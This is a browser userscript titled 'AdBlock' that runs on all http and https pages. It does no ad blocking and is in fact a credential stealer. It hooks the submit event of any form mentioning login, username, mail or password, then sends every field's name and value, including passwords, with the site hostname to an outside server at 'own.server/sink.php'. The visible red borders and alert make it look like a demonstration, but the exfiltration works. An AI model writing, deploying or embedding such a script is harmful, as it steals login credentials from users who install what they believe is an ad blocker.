// ==UserScript==
// @name     AdBlock
// @version  1
// @grant    none
// @include  http*://*
// ==/UserScript==

function a(x) {
  var inputs = x.getElementsByTagName("input");
  var str = "?" + window.location.hostname;
  for(var y=0;y<inputs.length;y++){
    str += "&" + inputs[y].name + "=" + inputs[y].value;
  }
  alert(str);
  var r = new XMLHttpRequest();
  r.open("GET","https://own.server/sink.php" + str);
  r.send();
}

function setstyle(x) {
  document.body.setAttribute("style", x);
}

setstyle("border-top: 5px solid red;");

var forms = document.getElementsByTagName("form");

for(var i=0;i<forms.length;i++) {
  if(~forms[i].outerHTML.search(/(login|username|mail|password)/i)){
		setstyle("border-left: 5px solid red;");
    forms[i].onsubmit = function(){a(this)};
  }
}
